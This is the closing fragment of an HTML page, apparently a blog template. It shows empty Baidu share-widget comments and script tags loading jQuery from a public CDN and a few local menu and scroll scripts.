</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>